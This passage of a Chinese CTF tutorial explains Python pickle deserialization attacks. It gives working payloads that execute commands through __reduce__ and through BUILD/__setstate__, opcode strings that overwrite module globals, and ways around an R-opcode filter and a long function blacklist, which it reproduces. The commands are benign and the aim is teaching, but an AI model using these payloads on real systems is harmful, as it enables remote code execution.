class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;cnt\\nsystem\\np0\\n(Vwhoami\\np1\\ntp2\\nRp3\\n.&#x27;</span><br><span class=\"line\">    0: c    GLOBAL     &#x27;nt system&#x27;</span><br><span class=\"line\">   11: p    PUT        0</span><br><span class=\"line\">   14: (    MARK</span><br><span class=\"line\">   15: V        UNICODE    &#x27;whoami&#x27;</span><br><span class=\"line\">   23: p        PUT        1</span><br><span class=\"line\">   26: t        TUPLE      (MARK at 14)</span><br><span class=\"line\">   27: p    PUT        2</span><br><span class=\"line\">   30: R    REDUCE</span><br><span class=\"line\">   31: p    PUT        3</span><br><span class=\"line\">   34: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 0</span><br></pre></td></tr></table></figure>\n<p>翻译的每个具体命令上面都有写</p>\n<p>因为 0 版本更容易构造，手写用 0 版本手写</p>\n<p>接下来的手搓 opcode 就有些离谱了，看这篇吧</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXNha2lrYXRhLmdpdGh1Yi5pby8yMDIwLzA0L3B5dGhvbi0lRTUlOEYlOEQlRTUlQkElOEYlRTUlODglOTclRTUlOEMlOTYvIyVFNiU4OSU4QiVFNSU4NiU5OW9wY29kZQ==\">python 反序列化～Misaki’s Blog (misakikata.github.io)</span></p>\n<h3 id=\"__reduce__r指令\"><a class=\"markdownIt-Anchor\" href=\"#__reduce__r指令\">#</a> __reduce__(R 指令)</h3>\n<p>ctf 中大多数常见的 pickle 反序列化，利用方法大都是 <code>__reduce__</code></p>\n<p>触发 <code>__reduce__</code> 的指令码为 <code>R</code> ，干了这么一件事情：</p>\n<blockquote>\n<p>取当前栈的栈顶记为 <code>args</code> ，然后把它弹掉。</p>\n<p>取当前栈的栈顶记为 <code>f</code> ，然后把它弹掉。</p>\n<p>以 <code>args</code>  为参数，执行函数 <code>f</code> ，把结果压进当前栈。</p>\n</blockquote>\n<p>class 的 <code>__reduce__</code> 方法，在 pickle 反序列化的时候会被执行。其底层的编码方法，就是利用了 <code>R</code>  指令码。  <code>f</code>  要么返回字符串，要么返回一个 tuple，后者对我们而言更有用。</p>\n<p>一种很流行的攻击思路是：利用  <code>__reduce__</code>  构造恶意字符串，当这个字符串被反序列化的时候， <code>__reduce__</code> 会被执行。</p>\n<p>正常的字符串反序列化后，得到一个 <code>Student</code>  对象。我们想构造一个字符串，它在反序列化的时候，执行 <code>dir</code>  指令。那么我们只需要这样得到 payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;sb&#x27;</span><br><span class=\"line\">        self.grade = &#x27;zz&#x27;</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\">        return (os.system,(&#x27;dir&#x27;,))</span><br><span class=\"line\"></span><br><span class=\"line\">payload = pickle.dumps(Student())</span><br><span class=\"line\">payload = pickletools.optimize(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">pickletools.dis(payload)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03cnt\\nsystem\\nX\\x03\\x00\\x00\\x00dir\\x85R.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;nt system&#x27;</span><br><span class=\"line\">   13: X    BINUNICODE &#x27;dir&#x27;</span><br><span class=\"line\">   21: \\x85 TUPLE1</span><br><span class=\"line\">   22: R    REDUCE</span><br><span class=\"line\">   23: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<p>现在把 payload 拿给正常的程序（Student 类里面没有 <code>__reduce__</code> 方法）去解析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;sb&#x27;</span><br><span class=\"line\">        self.grade = &#x27;zz&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">res = pickle.loads(b&#x27;\\x80\\x03cnt\\nsystem\\nX\\x03\\x00\\x00\\x00dir\\x85R.&#x27;)</span><br></pre></td></tr></table></figure>\n<p>即使 Student 类是正常的，pickle.loads 仍然执行了 os.system (‘dir’)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">C:\\Users\\18310\\AppData\\Local\\Programs\\Python\\Python37\\python.exe C:/Users/18310/Desktop/serial.py</span><br><span class=\"line\"> ������ C �еľ��� Windows-SSD</span><br><span class=\"line\"> ������к��� 4FEC-7D0B</span><br><span class=\"line\"></span><br><span class=\"line\"> C:\\Users\\18310\\Desktop\\sec֪ʶ��\\Ӧ����Ӧ\\py_pickel ��Ŀ¼</span><br><span class=\"line\"></span><br><span class=\"line\">2022/11/24  11:45    &lt;DIR&gt;          .</span><br><span class=\"line\">2022/11/24  11:45    &lt;DIR&gt;          ..</span><br><span class=\"line\">2022/11/24  11:44    &lt;DIR&gt;          .idea</span><br><span class=\"line\">2021/10/07  14:22            16,958 6.png</span><br><span class=\"line\">2022/08/17  21:43             2,938 aaaa.gif</span><br><span class=\"line\">2022/08/17  21:53    &lt;DIR&gt;          build</span><br></pre></td></tr></table></figure>\n<p>只要在序列化中的字符串中存在 <code>R</code>  指令， <code>__reduce__</code> 方法就会被执行，无论正常程序中是否写明了 <code>__reduce__</code></p>\n<p>由于 <code>__reduce__</code> 方法对应的操作码是 <code>R</code> ，只需要<strong>把操作码 <code>R</code>  过滤掉</strong>就行了。这个可以很方便地利用 <code>pickletools.genops</code>  来实现。</p>\n<p><strong>绕过黑名单</strong></p>\n<p>有一种过滤方式：不禁止 <code>R</code>  指令码，但是对 <code>R</code>  执行的函数有黑名单限制。典型的例子是 2018-XCTF-HITB-WEB : Python’s-Revenge。给了好长好长一串黑名单：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br></pre></td></tr></table></figure>\n<p>可惜 <code>platform.popen()</code>  不在名单里，它可以做到类似 <code>system</code>  的功能。这题死于黑名单有漏网之鱼。</p>\n<p>还有一个解，那就是利用 map</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class Exploit(object):</span><br><span class=\"line\">    def __reduce__(self):</span><br><span class=\"line\"> \treturn map,(os.system,[&quot;ls&quot;])</span><br></pre></td></tr></table></figure>\n<h3 id=\"全局变量包含覆盖c指令码\"><a class=\"markdownIt-Anchor\" href=\"#全局变量包含覆盖c指令码\">#</a> 全局变量包含覆盖： <code>c</code>  指令码</h3>\n<p><code>c</code>  指令码可以用来调用全局的 <code>xxx.xxx</code>  的值</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> secret</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> pickletools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">flag</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self,a,b</span>):</span><br><span class=\"line\">        self.a = a</span><br><span class=\"line\">        self.b = b</span><br><span class=\"line\"><span class=\"comment\"># new_flag = pickle.dumps(flag(&#x27;A&#x27;,&#x27;B&#x27;),protocol=3)</span></span><br><span class=\"line\"><span class=\"comment\"># print(new_flag)</span></span><br><span class=\"line\"><span class=\"comment\"># pickletools.dis(new_flag)</span></span><br><span class=\"line\"></span><br><span class=\"line\">your_payload = <span class=\"string\">b&#x27;?&#x27;</span></span><br><span class=\"line\">other_flag = pickle.loads(your_payload)</span><br><span class=\"line\">secret_flag = flag(secret.a,secret.b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> other_flag.a == secret_flag.a <span class=\"keyword\">and</span> other_flag.b == secret_flag.b:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;flag&#123;xxxxxx&#125;&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;No!&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># secret.py</span></span><br><span class=\"line\"><span class=\"comment\"># you can not see this</span></span><br><span class=\"line\">a = <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">b = <span class=\"string\">&#x27;bbbb&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>现在的任务是：给出一个字符串，<strong>反序列化之后，a 和 b 需要与 secret 这个 module 里面的 a、b 相对应</strong>。</p>\n<p>在我们不知道 <code>secret.py</code>  中值的情况下，如何构造满足条件的 payload，拿到 flag</p>\n<p>不能用 <code>R</code>  指令码了， <code>c</code>  指令码专门用来获取一个全局变量。</p>\n<p>我们先弄一个正常的 Student 来看看序列化之后的效果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\">import pickle</span><br><span class=\"line\">class Student():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        self.name = &#x27;sb&#x27;</span><br><span class=\"line\">        self.grade = &#x27;zz&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#     def __reduce__(self):</span><br><span class=\"line\">#         return (os.system,(&#x27;dir&#x27;,))</span><br><span class=\"line\">#</span><br><span class=\"line\">payload = pickle.dumps(Student())</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">payload = pickletools.optimize(payload)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br><span class=\"line\">pickletools.dis(payload)</span><br><span class=\"line\">print(&quot;--------------&quot;)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nStudent\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x04\\x00\\x00\\x00nameq\\x03X\\x02\\x00\\x00\\x00sbq\\x04X\\x05\\x00\\x00\\x00gradeq\\x05X\\x02\\x00\\x00\\x00zzq\\x06ub.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x02\\x00\\x00\\x00sbX\\x05\\x00\\x00\\x00gradeX\\x02\\x00\\x00\\x00zzub.&#x27;</span><br><span class=\"line\">--------------</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class=\"line\">   20: )    EMPTY_TUPLE</span><br><span class=\"line\">   21: \\x81 NEWOBJ</span><br><span class=\"line\">   22: &#125;    EMPTY_DICT</span><br><span class=\"line\">   23: (    MARK</span><br><span class=\"line\">   24: X        BINUNICODE &#x27;name&#x27;</span><br><span class=\"line\">   33: X        BINUNICODE &#x27;sb&#x27;</span><br><span class=\"line\">   40: X        BINUNICODE &#x27;grade&#x27;</span><br><span class=\"line\">   50: X        BINUNICODE &#x27;zz&#x27;</span><br><span class=\"line\">   57: u        SETITEMS   (MARK at 23)</span><br><span class=\"line\">   58: b    BUILD</span><br><span class=\"line\">   59: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br><span class=\"line\">--------------</span><br></pre></td></tr></table></figure>\n<p>注意看 33 和 50 行的变量值，以 name 的为例，只需要把硬编码的 <code>sb</code>  改成从 <code>secret</code>  引入的 <code>name</code> ，写成指令就是： <code>csecret\\nname\\n</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> 0: \\x80 PROTO      3</span><br><span class=\"line\"> 2: c    GLOBAL     &#x27;__main__ Student&#x27;</span><br><span class=\"line\">20: )    EMPTY_TUPLE</span><br><span class=\"line\">21: \\x81 NEWOBJ</span><br><span class=\"line\">22: &#125;    EMPTY_DICT</span><br><span class=\"line\">23: (    MARK</span><br><span class=\"line\">24: X        BINUNICODE &#x27;name&#x27;</span><br><span class=\"line\">33: c        GLOBAL \t   &#x27;secret name&#x27;</span><br><span class=\"line\">40: X        BINUNICODE &#x27;grade&#x27;</span><br><span class=\"line\">50: c        GLOBAL \t   &#x27;secret grade&#x27;</span><br><span class=\"line\">57: u        SETITEMS   (MARK at 23)</span><br><span class=\"line\">58: b    BUILD</span><br><span class=\"line\">59: .    STOP</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">原来的：b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03X\\x01\\x00\\x00\\x00Aq\\x04X\\x01\\x00\\x00\\x00bq\\x05X\\x01\\x00\\x00\\x00Bq\\x06ub.&#x27;</span><br><span class=\"line\">现在的：</span><br><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81q\\x01&#125;q\\x02(X\\x01\\x00\\x00\\x00aq\\x03csecret\\na\\nq\\x04X\\x01\\x00\\x00\\x00bq\\x05csecret\\nb\\nq\\x06ub.&#x27;</span><br></pre></td></tr></table></figure>\n<p>或者再举个例子</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-b42656fa4b3c95eaee8c37dccacad636_720w.webp\" alt=\"img\"></p>\n<p>现在的任务是：给出一个字符串，<strong>反序列化之后，name 和 grade 需要与 blue 这个 module 里面的 name、grade 相对应</strong>。</p>\n<p>正常的 student 类序列化之后的效果：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-8b0cb8c071dadcde37abdce434a8f180_720w.webp\" alt=\"img\"></p>\n<p>以 name 的为例，只需要把硬编码的 <code>rxz</code>  改成从 <code>blue</code>  引入的 <code>name</code> ，写成指令就是： <code>cblue\\nname\\n</code> 。把用于编码 <code>rxz</code>  的 <code>X\\x03\\x00\\x00\\x00rxz</code>  替换成我们的这个 global 指令</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-2a5604887f01ef88aebf6409279e82a1_720w.webp\" alt=\"img\"></p>\n<p>顺带一提，由于 pickle 导出的字符串里面有很多的不可见字符，所以一般都经过 base64 编码之后传输。</p>\n<p>如果你也不能手搓 opcode，看看这两个链接？</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMy43L0xpYi9waWNrbGUucHk=\">cpython/pickle.py at 3.7 · python/cpython (github.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9hbmFwaWNrbGUvYmxvYi9tYXN0ZXIvYW5hcGlja2xlLnB5\">anapickle/anapickle.py at master · sensepost/anapickle (github.com)</span></p>\n<p>绕过黑名单</p>\n<p>之前提到过， <code>c</code>  指令（也就是 GLOBAL 指令）基于 <code>find_class</code>  这个方法， 然而 <code>find_class</code>  可以被出题人重写。如果出题人只允许 <code>c</code>  指令包含 <code>__main__</code> 这一个 module，这道题又该如何解决呢</p>\n<p>通过 GLOBAL 指令引入的变量，可以看作是原变量的引用。我们在栈上修改它的值，会导致原变量也被修改！</p>\n<ul>\n<li>通过 <code>__main__.blue</code>  引入这一个 module，由于命名空间还在 main 内，故不会被拦截</li>\n<li>把一个 dict 压进栈，内容是 <code>&#123;'name': 'rua', 'grade': 'www'&#125;</code></li>\n<li>执行 BUILD 指令，会导致改写  <code>__main__.blue.name</code>  和  <code>__main__.blue.grade</code>  ，至此 <code>blue.name</code>  和 <code>blue.grade</code>  已经被篡改成我们想要的内容</li>\n<li>弹掉栈顶，现在栈变成空的</li>\n<li>照抄正常的 Student 序列化之后的字符串，压入一个正常的 Student 对象，name 和 grade 分别是’rua’和’www’</li>\n</ul>\n<p>由于栈顶是正常的 Student 对象，pickle.loads 将会正常返回。到手的 Student 对象，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1uYW1lZ3JhZGVibHVlLTQ1MHVqOTZlZW4zYmR0MWQ5c3hnLm5hbWU=\">当然 name 和 grade 都与 blue.name</span>、blue.grade 对应了 —— 我们刚刚亲手把 blue 篡改掉。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-be0b611551c62614ea92f06ffe234480_r.jpg\" alt=\"img\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = b&#x27;\\x80\\x03c__main__\\nblue\\n&#125;(Vname\\nVrua\\nVgrade\\nVwww\\nub0c__main__\\nStudent\\n)\\x81&#125;(X\\x04\\x00\\x00\\x00nameX\\x03\\x00\\x00\\x00ruaX\\x05\\x00\\x00\\x00gradeX\\x03\\x00\\x00\\x00wwwub.&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import blue</span><br><span class=\"line\">def check(data):</span><br><span class=\"line\">    if b&#x27;R&#x27; in data:</span><br><span class=\"line\">        return &#x27;no reduce!&#x27;</span><br><span class=\"line\">    x = pickle.loads(data)</span><br><span class=\"line\">    </span><br><span class=\"line\">    if (x != Student(blue.name, blue.grade)):</span><br><span class=\"line\">        return &#x27;not equal&#x27;</span><br><span class=\"line\">    return f&#x27;well done now blue.grade=&#123;blue.grade&#125;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">print(check(base64.b64decode(input())))</span><br></pre></td></tr></table></figure>\n<h3 id=\"使用build指令rce\"><a class=\"markdownIt-Anchor\" href=\"#使用build指令rce\">#</a> 使用 build 指令 rce</h3>\n<p><code>__reduce__</code> 与 <code>R</code>  指令是绑定的，禁止了 <code>R</code>  指令就禁止了 <code>__reduce__</code>  方法。那么，在禁止 <code>R</code>  指令的情况下，我们还能 RCE 吗？</p>\n<p>现在的目标是，利用指令码，构造出任意命令执行。那么我们需要找到一个函数调用 <code>fun(arg)</code> ，其中 <code>fun</code>  和 <code>arg</code>  都必须可控。</p>\n<p>审 pickle 源码，来看看 BUILD 指令（指令码为 <code>b</code> ）是如何工作的：</p>\n<p>这里的实现方式也就是上文的注所提到的：如果 <code>inst</code>  拥有 <code>__setstate__</code> 方法，则把 <code>state</code>  交给 <code>__setstate__</code> 方法来处理；否则的话，直接把 <code>state</code>  这个 <code>dist</code>  的内容，合并到 <code>inst.__dict__ </code> 里面。</p>\n<p>通过 BUILD 指令与 C 指令的结合，我们可以把改写为 <code>os.system</code>  或其他函数</p>\n<p><code>Student</code>  原先是没有 <code>__setstate__</code> 这个方法的。那么我们利用 <code>&#123;'__setstate__': os.system&#125;</code>  来 BUILD 这个对象，那么现在对象的 <code>__setstate__</code> 就变成了 <code>os.system</code> ；接下来利用 <code>&quot;ls /&quot;</code>  来再次 BUILD 这个对象，则会执行 <code>setstate(&quot;ls /&quot;)</code>  ，而此时 <code>__setstate__</code> 已经被我们设置为 <code>os.system</code> ，因此实现了 RCE.</p>\n<p>payload 构造如下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls /\\nb.&#x27;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-5f6f6661a916b296e3fac6fbed8427cc_720w.webp\" alt=\"img\"></p>\n<p>有一个可以改进的地方：这份 payload 由于没有返回一个 Student，导致后面抛出异常。要让后面无异常也很简单：干完了恶意代码之后把栈弹到空，然后压一个正常 Student 进栈。payload 构造如下：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload = b&#x27;\\x80\\x03c__main__\\nStudent\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVls /\\nb0c__main__\\nStu</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/v2-fd188e8d3e3f341d719019b7e869bf9d_720w.webp\" alt=\"img\"></p>\n<p>具体构造 payload 的方法：</p>\n<p>假设我们有一个 flag 类</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import pickle</span><br><span class=\"line\">import pickletools</span><br><span class=\"line\"></span><br><span class=\"line\">class flag():</span><br><span class=\"line\">    def __init__(self):</span><br><span class=\"line\">        pass</span><br><span class=\"line\">new_flag = pickle.dumps(flag(),protocol=3)</span><br><span class=\"line\">print(new_flag)</span><br><span class=\"line\">pickletools.dis(new_flag)</span><br><span class=\"line\"></span><br><span class=\"line\"># your_payload = b&#x27;?&#x27;</span><br><span class=\"line\"># other_flag = pickle.loads(your_payload)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81q\\x01.&#x27;</span><br><span class=\"line\">    0: \\x80 PROTO      3</span><br><span class=\"line\">    2: c    GLOBAL     &#x27;__main__ flag&#x27;</span><br><span class=\"line\">   17: q    BINPUT     0</span><br><span class=\"line\">   19: )    EMPTY_TUPLE</span><br><span class=\"line\">   20: \\x81 NEWOBJ</span><br><span class=\"line\">   21: q    BINPUT     1</span><br><span class=\"line\">   23: .    STOP</span><br><span class=\"line\">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>\n<p>根据 BUILD 的说明，我们需要构造一个字典</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;.&#x27;</span><br></pre></td></tr></table></figure>\n<p>接下来往字典里放值，先放一个 mark</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(.&#x27;</span><br></pre></td></tr></table></figure>\n<p>放键值对</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">b&#x27;\\x80\\x03c__main__\\nflag\\nq\\x00)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nu.&#x27;</span><br></pre></td></tr></table></figure>\n<p>第一次 BUILD</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span 